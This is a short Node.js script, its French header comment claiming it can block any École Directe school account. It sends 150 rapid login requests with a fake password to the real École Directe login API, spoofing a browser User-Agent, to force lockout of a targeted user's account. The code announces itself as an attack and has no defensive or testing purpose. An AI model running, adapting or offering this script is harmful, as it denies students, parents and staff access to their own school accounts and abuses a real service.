//CODE PERMETTANT DE BLOQUER N'IMPORTE QUEL COMPTE ECOLE DIRECTE BY GASLEBOSS
const readline = require('readline');
const fs = require('fs');
const fetch = require('node-fetch');

async function login(identifiant, motdepasse, fa = []) {
   

    const loginData = `data=${encodeURIComponent(JSON.stringify({
        identifiant: identifiant,
        motdepasse: motdepasse,
        isReLogin: false,
        uuid: "",
        fa: fa
    }))}`;

    try {
        const response = await fetch('https://api.ecoledirecte.com/v3/login.awp', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36'
            },
            body: loginData
        });

        const result = await response.json();

        console.log("Packet contenant les données envoyé à écoledirecte.com : ", result.code);
    } catch (error) {
        console.error("Erreur lors de la requête : ", error);
    }
    return null;
}


(async () => {
    console.log("Début de l'attaque'...");
    for (let i = 0; i < 150; i++) {
        const identifiant = ""
        const loginResult = await login(identifiant, 'fakepassword');

        await new Promise(resolve => setTimeout(resolve, 100));
    }
})();
